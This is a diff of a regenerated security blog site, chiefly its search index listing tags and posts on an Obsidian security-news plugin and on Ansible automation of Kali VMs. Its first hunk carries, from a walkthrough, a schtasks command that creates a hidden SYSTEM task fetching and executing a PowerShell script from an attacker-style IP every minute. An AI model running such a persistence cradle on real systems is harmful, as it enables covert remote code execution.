-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>schtasks /create /tn CradleScript /tr <span style="color:#e6db74">&#34;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((New-Object Net.WebClient).DownloadString(&#39;&#39;http://10.10.14.31:7070/script.ps1&#39;&#39;&#39;))&#39;&#34;</span> /sc minute /mo <span style="color:#ae81ff">1</span> /ru System
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>schtasks /create /tn CradleScript /tr <span style="color:#e6db74">&#34;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((New-Object Net.WebClient).DownloadString(&#39;&#39;http://10.10.14.31:7070/script.ps1&#39;&#39;&#39;))&#39;&#34;</span> /sc minute /mo <span style="color:#ae81ff">1</span> /ru System
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-22-072120_.png">
 </figure>
@@ -2289,6 +2289,13 @@ document.addEventListener("DOMContentLoaded", function() {
 <script>
 window.store = {
     
+    "\/\/uildDrafts:1313\/tags\/ansible\/": {
+        "title": "Ansible",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/ansible\/"
+    },
+    
     "\/\/uildDrafts:1313\/author\/": {
         "title": "Author",
         "tags": [],
@@ -2296,11 +2303,11 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/author\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/blind\/": {
-        "title": "Blind",
+    "\/\/uildDrafts:1313\/tags\/automation\/": {
+        "title": "Automation",
         "tags": [],
         "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/blind\/"
+        "url": "\/\/uildDrafts:1313\/tags\/automation\/"
     },
     
     "\/\/uildDrafts:1313\/author\/bloodstiller\/": {
@@ -2315,6 +2322,55 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/dotfiles\/": {
+        "title": "Dotfiles",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/dotfiles\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/kali\/": {
+        "title": "Kali",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/kali\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/qemu\/": {
+        "title": "Qemu",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/qemu\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tools\/security-newsroom-plugin\/security-newsroom-obsidian-plugin\/": {
+        "title": "Security Newsroom Obsidian Plugin Release",
+        "tags": ["kali","automation","qemu","ansible","dotfiles",],
+        "content": "Security Newsroom Obsidian Plugin Release I\u0026rsquo;ve been quiet for a while. Work has been busy \u0026amp; I have been doing some other projects that I can\u0026rsquo;t get into\u0026hellip;\u0026hellip;\nI\u0026rsquo;ve made the switch from my beloved eMacs to obsidian over the last few months and apart from the first week it\u0026rsquo;s been relatively painless. I\u0026rsquo;ve managed to recreate 99% of all eMacs functionality in obsidian (that\u0026rsquo;s functionality I used, not all of eMacs functionality as that would not be possible.)\nOne thing that I have found myself needing is an easy way to keep up with security related news. As the landscape is constantly evolving and growing and there a million different sources to get information from I got bored of jumping around so I thought \u0026ldquo;what if it was just in obsidian\u0026rdquo;. I use obsidian as my web-clipper anyone so let\u0026rsquo;s just put the functionality in here (I say here as I am writing the post in Obsidian)\nSo I decided to create the security newsroom plugin. https://github.com/bloodstiller/obsidian-security-newsroom I\u0026rsquo;ve created a pull request for it to be placed into the official community plugins but so far it has not.\nIt essentially pulls from lots of security resources and allows you to filter, save \u0026amp; clip the whole articles directly within obsidian.\nFull video showing how it works. At the moment as it\u0026rsquo;s not currently approved in the obsidian store if you want to use it you will have to manually add a folder called in your .obsidian/plugins folder called security-newsroom and place the main.js, manifest.json \u0026amp; styles.css from the repo and then load the plugin.\n", 
+        "url": "\/\/uildDrafts:1313\/tools\/security-newsroom-plugin\/security-newsroom-obsidian-plugin\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/": {
+        "title": "Tags",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tools\/": {
+        "title": "Tools",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tools\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/blind\/": {
+        "title": "Blind",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/blind\/"
     },
     
     "\/\/uildDrafts:1313\/tags\/ctf-writeup\/": {
@@ -2394,13 +2450,6 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/portswigger\/sqli_lab_15\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/": {
-        "title": "Tags",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/"
-    },
-    
     "\/\/uildDrafts:1313\/tags\/waf\/": {
         "title": "Waf",
         "tags": [],
@@ -2409,7 +2458,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/web-exploitation\/": {
-        "title": "Web-Exploitation",
+        "title": "Web Exploitation",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/web-exploitation\/"
@@ -2822,7 +2871,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/llm\/": {
-        "title": "Llm",
+        "title": "LLM",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/llm\/"
@@ -3277,7 +3326,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/msi\/": {
-        "title": "MSI",
+        "title": "Msi",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/msi\/"
@@ -3673,13 +3722,6 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/tools\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tools\/": {
-        "title": "Tools",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tools\/"
     },
     
     "\/\/uildDrafts:1313\/tags\/vulnerability-assessment\/": {
@@ -4131,7 +4173,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/ssrf\/": {
-        "title": "Ssrf",
+        "title": "SSRF",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/ssrf\/"
@@ -4641,46 +4683,11 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/homelab\/20250220118-nixos-homelab\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/ansible\/": {
-        "title": "Ansible",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/ansible\/"
-    },
-    
     "\/\/uildDrafts:1313\/tools\/automatingqemukalivmansible\/": {
         "title": "Automating Kali Linux VM Setup: A Comprehensive Guide to QEMU and Ansible Integration",
         "tags": ["kali","automation","qemu","ansible","dotfiles",],
         "content": "As a cybersecurity enthusiast and productivity junkie, I\u0026rsquo;ve always been fascinated by the power of automation. Recently, I decided to streamline my process of setting up Kali Linux virtual machines using QEMU and Ansible. In this article, I\u0026rsquo;ll walk you through how I\u0026rsquo;ve automated the creation and configuration of Kali VMs, complete with my preferred dotfiles and tools.\nThe Need for Automation If you\u0026rsquo;re like me, you probably find yourself creating new Kali VMs frequently for various projects or testing environments. The process of setting up a new VM, updating the system, installing your favorite tools, and configuring your environment can be time-consuming and repetitive. That\u0026rsquo;s where automation comes in handy. You can repurpose this setup for other projects, just change the Ansible playbook and dotfiles.\nBenefits and Challenges This automation setup offers several advantages:\nConsistent environment across all VMs Rapid deployment of new instances Version-controlled configuration (infrastructure as code) Easy sharing and collaboration Some challenges I encountered:\nVirtioFS setup complexity Ansible role organization Package version management Dotfiles synchronization But the benefits far outweigh the initial setup effort.\nPrerequisites Choose your preferred virtualization provider:\nVirtualBox Setup VirtualBox Vagrant Ansible QEMU/KVM Setup (Linux only) (My preferred setup) QEMU/KVM (≥ 4.2) Libvirt (≥ 6.2.0) Vagrant Ansible For QEMU/KVM shared folder support:\nHost: Linux kernel ≥ 5.4\nGuest: Linux kernel ≥ 5.4\nThere is some additional setup required for the vagrant-libvirt plugin so would advise you checkout QEMU/KVM Setup Guide Unable to resolve dependency vagrant-libvirterror: +Update+ 21/02/2025 I recently ran an update and encountered an issue where it refused to launch new VM\u0026rsquo;s. I received an error similar to the below (it was not exactly the same as I had a crash shortly after). Error message given during initialization: Unable to resolve dependency: user requested 'vagrant-libvirt (= 0.12.2)' after alot of searching I found this post I found following the steps resolved the issue. vagrant plugin repair vagrant plugin expunge --reinstall vagrant plugin update VAGRANT_DISABLE_STRICT_DEPENDENCY_ENFORCEMENT=1 vagrant plugin install vagrant-libvirt The Automation Stack My automation setup consists of three main components:\nVagrant for VM provisioning QEMU/KVM for virtualization Ansible for configuration management Let\u0026rsquo;s dive into each component.\n1. Vagrant with QEMU/KVM I chose QEMU/KVM over VirtualBox for several reasons:\nBetter performance on Linux hosts Once you have used KVM/QEMU you will never go back to VirtualBox etc. Native virtualization support VirtioFS for efficient file sharing The Vagrantfile handles:\nVM resource allocation (RAM, CPU) Network configuration Shared folder setup with VirtioFS Ansible provisioner integration Here\u0026rsquo;s the the Vagrantfile:\n# -*- mode: ruby -*- # vi: set ft=ruby : Vagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.box = \u0026#34;kalilinux/rolling\u0026#34; config.vm.hostname = \u0026#34;kali-vm\u0026#34; # Set hostname inside VM # Disable the default share config.vm.synced_folder \u0026#34;.\u0026#34;, \u0026#34;/vagrant\u0026#34;, disabled: true # Force libvirt provider ENV[\u0026#39;VAGRANT_DEFAULT_PROVIDER\u0026#39;] = \u0026#39;libvirt\u0026#39; # QEMU/libvirt specific settings config.vm.provider :libvirt do |libvirt| libvirt.memory = 8192 libvirt.cpus = 4 libvirt.graphics_type = \u0026#34;spice\u0026#34; libvirt.video_type = \u0026#34;qxl\u0026#34; libvirt.title = \u0026#34;Kali Linux VM\u0026#34; # Set VM title in libvirt libvirt.description = \u0026#34;Kali Linux VM for Security Testing\u0026#34; # Optional description # Enable shared memory for VirtioFS libvirt.memorybacking :access, :mode =\u0026gt; \u0026#34;shared\u0026#34; end # Configure shared folders using VirtioFS config.vm.synced_folder \u0026#34;/home/martin/.config/tmuxinator\u0026#34;, \u0026#34;/home/vagrant/.config/tmuxinator\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career/45-KaliShared/45.02-LinuxTools\u0026#34;, \u0026#34;/home/vagrant/linuxTools\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career/45-KaliShared/45.01-WindowsTools\u0026#34;, \u0026#34;/home/vagrant/windowsTools\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career\u0026#34;, \u0026#34;/home/vagrant/Dropbox/40-49_Career\u0026#34;, type: \u0026#34;virtiofs\u0026#34; # Network settings config.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.57.11\u0026#34; config.ssh.forward_x11 = true # Provisioning configuration for Ansible config.vm.provision \u0026#34;ansible\u0026#34; do |ansible| ansible.playbook = \u0026#34;../../Ansible/configure-kali.yml\u0026#34; end end 2. Ansible Configuration Ansible automates the entire VM setup process. The main playbook handles:\nSystem updates and package installation Development tools setup Security tools installation Terminal environment configuration (Alacritty, Tmux) Editor setup (Doom Emacs) Dotfiles deployment Here\u0026rsquo;s the main Ansible playbook:\n--- - name: Configure Kali Linux hosts: all become: yes # This is equivalent to using sudo vars: user_home: \u0026#34;/home/vagrant\u0026#34; docker_gpg_key_url: \u0026#34;https://download.docker.com/linux/debian/gpg\u0026#34; docker_repo: \u0026#34;deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable\u0026#34; tasks: - name: Update apt cache apt: update_cache: yes cache_valid_time: 3600 - name: Download Iosevka Nerd Font (be patient big file!) get_url: url: https://github.com/ryanoasis/nerd-fonts/releases/download/v3.3.0/Iosevka.zip dest: /tmp/Iosevka.zip mode: \u0026#39;0644\u0026#39; - name: Install unzip if not present apt: name: unzip state: present - name: Extract Iosevka font unarchive: src: /tmp/Iosevka.zip dest: \u0026#34;/usr/local/share/fonts/\u0026#34; remote_src: yes owner: vagrant group: vagrant - name: Update font cache command: fc-cache -fv become_user: vagrant - name: Install base packages apt: name: - eza - alacritty - git - bat - seclists - git - emacs - ripgrep - fd-find state: present - name: Create docker GPG directory file: path: /etc/apt/keyrings state: directory mode: \u0026#39;0755\u0026#39; - name: Check if Docker GPG key exists stat: path: /etc/apt/keyrings/docker.gpg register: docker_gpg - name: Add Docker GPG key shell: | curl -fsSL {{ docker_gpg_key_url }} | gpg --dearmor -o /etc/apt/keyrings/docker.gpg when: not docker_gpg.stat.exists - name: Check if Docker repository exists stat: path: /etc/apt/sources.list.d/docker.list register: docker_repo_file - name: Add Docker repository copy: content: \u0026#34;{{ docker_repo }}\u0026#34; dest: /etc/apt/sources.list.d/docker.list when: not docker_repo_file.stat.exists - name: Install Docker packages apt: name: - docker-ce - docker-ce-cli - containerd.io update_cache: yes state: present - name: Download Starship install script get_url: url: https://starship.rs/install.sh dest: /tmp/starship-install.sh mode: \u0026#39;0755\u0026#39; register: download_script - name: Install Starship shell: /tmp/starship-install.sh --yes args: creates: /usr/local/bin/starship when: download_script is success async: 180 # 5 minute timeout poll: 5 # Check every 5 seconds - name: Install oh-my-zsh become_user: vagrant shell: sh -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026#34; \u0026#34;\u0026#34; --unattended args: creates: \u0026#34;{{ user_home }}/.oh-my-zsh\u0026#34; - name: Install zsh plugins become_user: vagrant git: repo: \u0026#34;{{ item.repo }}\u0026#34; dest: \u0026#34;{{ user_home }}/.oh-my-zsh/custom/plugins/{{ item.name }}\u0026#34; loop: - { repo: \u0026#39;https://github.com/zsh-users/zsh-autosuggestions\u0026#39;, name: \u0026#39;zsh-autosuggestions\u0026#39; } - { repo: \u0026#39;https://github.com/zsh-users/zsh-syntax-highlighting.git\u0026#39;, name: \u0026#39;zsh-syntax-highlighting\u0026#39; } - { repo: \u0026#39;https://github.com/marlonrichert/zsh-autocomplete.git\u0026#39;, name: \u0026#39;zsh-autocomplete\u0026#39; } - { repo: \u0026#39;https://github.com/zdharma-continuum/fast-syntax-highlighting.git\u0026#39;, name: \u0026#39;fast-syntax-highlighting\u0026#39; } - name: Install tmuxinator gem: name: tmuxinator state: present - name: Clone Statistically Likely Usernames git: repo: https://github.com/insidetrust/statistically-likely-usernames.git dest: /usr/share/wordlists/statistically-likely-usernames - name: Download and install Kerbrute get_url: url: https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 dest: /usr/local/bin/kerbrute mode: \u0026#39;0755\u0026#39; - name: Install build dependencies for Emacs apt: name: - build-essential - libgccjit-12-dev - libgnutls28-dev - libjansson4 - libjansson-dev - libncurses-dev - libsqlite3-dev - libgif-dev - libjpeg-dev - libpng-dev - libtiff5-dev - libxpm-dev - libwebp-dev - libgtk-3-dev - texinfo - autoconf - automake - pkg-config state: present install_recommends: no register: pkg_result retries: 3 delay: 5 until: pkg_result is success - name: Install tree-sitter separately apt: name: libtree-sitter-dev state: present register: tree_sitter_result retries: 3 delay: 5 until: tree_sitter_result is success - name: Check if Emacs 29.4 is installed command: emacs --version register: emacs_version ignore_errors: true changed_when: false - name: Clone Emacs repository git: repo: git://git.savannah.gnu.org/emacs.git dest: /tmp/emacs version: emacs-29.4 when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Run autogen shell: | cd /tmp/emacs ./autogen.sh when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Configure Emacs shell: | cd /tmp/emacs ./configure --with-native-compilation --with-json --with-tree-sitter --with-sqlite3 args: creates: /tmp/emacs/Makefile when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Build Emacs shell: | cd /tmp/emacs make -j$(nproc) args: creates: /tmp/emacs/src/emacs when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; async: 1800 poll: 15 - name: Install Emacs become: yes shell: | cd /tmp/emacs make install args: creates: /usr/local/bin/emacs when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; async: 900 poll: 15 - name: Install other base packages apt: name: - eza - alacritty - git - bat - seclists - ripgrep - fd-find state: present install_recommends: no - name: Setup dotfiles become_user: vagrant block: - name: Clone dotfiles git: repo: https://github.com/bloodstiller/kaliconfigs.git dest: \u0026#34;{{ user_home }}/.dotfiles\u0026#34; version: main # Or whatever branch you\u0026#39;re using update: yes # Ensures latest version is cloned clone: yes force: yes # This will overwrite local changes - name: Create required directories file: path: \u0026#34;{{ item }}\u0026#34; state: directory loop: - \u0026#34;{{ user_home }}/.doom.d\u0026#34; - \u0026#34;{{ user_home }}/.config\u0026#34; - name: Create symlinks file: src: \u0026#34;{{ item.src }}\u0026#34; dest: \u0026#34;{{ item.dest }}\u0026#34; state: link force: yes loop: - { src: \u0026#34;{{ user_home }}/.dotfiles/Zsh/.zshrc\u0026#34;, dest: \u0026#34;{{ user_home }}/.zshrc\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/config.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/config.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/init.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/init.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/packages.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/packages.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/README.org\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/README.org\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Starship/starship.toml\u0026#34;, dest: \u0026#34;{{ user_home }}/.config/starship.toml\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Alacritty\u0026#34;, dest: \u0026#34;{{ user_home }}/.config/Alacritty\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Tmux/.tmux.conf\u0026#34;, dest: \u0026#34;{{ user_home }}/.tmux.conf\u0026#34; } - name: Install Doom Emacs become_user: vagrant block: - name: Clone Doom Emacs git: repo: https://github.com/doomemacs/doomemacs dest: \u0026#34;{{ user_home }}/.config/emacs\u0026#34; depth: 1 - name: Install Doom Emacs # This is correct and the path is correct! shell: \u0026#34;{{ user_home }}/.config/emacs/bin/doom install --force\u0026#34; args: creates: \u0026#34;{{ user_home }}/.emacs.d/bin/doom\u0026#34; async: 900 poll: 15 - name: Update Doom recipe repositories shell: \u0026#34;{{ user_home }}/.config/emacs/bin/doom sync -u\u0026#34; async: 900 poll: 15 - name: Enable Docker service systemd: name: docker enabled: yes state: started - name: Add user to docker group user: name: vagrant groups: docker append: yes - name: Clean up apt: autoremove: yes clean: yes 3. Dotfiles and Tool Configuration The automation includes configuration for:\nAlacritty terminal emulator Tmux with custom keybindings Doom Emacs with security-focused packages Starship cross-shell prompt Zsh with Oh My Zsh Each tool has its own configuration module in the repository:\nAlacritty Configuration Tmux Configuration Doom Emacs Configuration Starship Configuration Zsh Configuration Included Tools \u0026amp; Features The automation sets up a comprehensive environment with:\nSecurity Tools SecLists (lots of lists) Kerbrute for Kerberos authentication testing Statistically Likely Usernames wordlist Common pentesting tools (I have my folders for linux \u0026amp; windows tools (I will make a repo for that soon)) Bloodhound for Active Directory analysis (dockerized) Development Environment Emacs 29.4 with native compilation Doom Emacs configuration This is my main editor and I use it for everything but if you prefer another editor you can change the Ansible playbook. Git version control Docker and Docker Compose Build tools and development libraries Modern Terminal Experience Alacritty terminal emulator Starship cross-shell prompt Tmuxinator for session management Command Line Improvements Eza (modern ls replacement) Bat (better cat) Ripgrep for searching fd-find for file discovery Enhanced Zsh configuration: zsh-autosuggestions zsh-syntax-highlighting zsh-autocomplete fast-syntax-highlighting Getting Started To use this automation:\nClone the repository:\ngit clone https://github.com/bloodstiller/kaliconfigs.git cd kaliconfigs Install prerequisites:\n# For Debian/Ubuntu sudo apt install qemu-kvm libvirt-daemon-system libvirt-clients vagrant ansible # For Arch Linux sudo pacman -S qemu-full libvirt vagrant ansible Start the VM:\ncd Vagrant/QEMU vagrant up Development Workflow For efficient development and testing:\nRerun only Ansible playbooks:\nvagrant provision Run Ansible directly against the VM:\nvagrant ssh-config \u0026gt; vagrant-ssh-config ansible-playbook -i .vagrant/provisioners/ansible/inventory/vagrant_ansible_inventory Ansible/configure-kali.yml Use snapshots for safe testing:\nvagrant snapshot save baseline vagrant snapshot restore baseline Customization Options The automation is highly customizable:\nVM Resources (Vagrantfile):\nconfig.vm.provider :libvirt do |libvirt| libvirt.memory = 8192 libvirt.cpus = 4 end Package Selection (Ansible):\n​ - name: Install base packages apt: name: ​ - eza ​ - alacritty ​ - git # Add your packages here Shared Folders:\nconfig.vm.synced_folder \u0026#34;/path/to/host\u0026#34;, \u0026#34;/path/in/guest\u0026#34;, type: \u0026#34;virtiofs\u0026#34; Documentation \u0026amp; Resources For detailed setup and configuration instructions, refer to:\nMain Project Documentation - Overview and quick start guide Ansible Configuration Guide - Detailed playbook customization QEMU/KVM Setup Guide - QEMU-specific installation and configuration Alacritty Configuration - Terminal emulator setup Doom Emacs Configuration - Editor configuration Tmux Configuration - Terminal multiplexer setup Starship Configuration - Shell prompt customization Zsh Configuration - Shell configuration and plugins Conclusion Automating Kali VM setup with QEMU and Ansible has significantly improved my workflow. The combination of Vagrant for VM management, QEMU for virtualization, and Ansible for configuration provides a powerful and flexible automation stack.\nThe complete code is available in my kaliconfigs repository . Feel free to fork it and adapt it to your needs.\nHappy hacking!\n", 
         "url": "\/\/uildDrafts:1313\/tools\/automatingqemukalivmansible\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/automation\/": {
-        "title": "Automation",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/automation\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/dotfiles\/": {
-        "title": "Dotfiles",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/dotfiles\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/kali\/": {
-        "title": "Kali",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/kali\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/qemu\/": {
-        "title": "Qemu",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/qemu\/"
     },
     
     "\/\/uildDrafts:1313\/walkthroughs\/redpanda-box\/": {
